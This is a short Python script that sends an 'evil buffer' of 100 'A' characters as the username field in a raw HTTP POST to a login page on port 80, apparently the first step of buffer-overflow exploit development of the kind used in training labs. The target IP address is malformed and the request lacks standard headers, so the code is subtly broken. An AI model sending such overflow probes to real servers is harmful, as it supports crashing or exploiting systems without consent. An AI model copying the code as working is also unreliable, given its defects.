#!/usr/bin/python
import socket

IP = "192.168/156.10"

try:
    print("\nSending evil buffer ")

    size = 100
    inputBuffer = "A"*size

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.connect((IP, 80))

    s.send(buffer)

    s.close()

    print("Done")

except:
    print("Could not connect")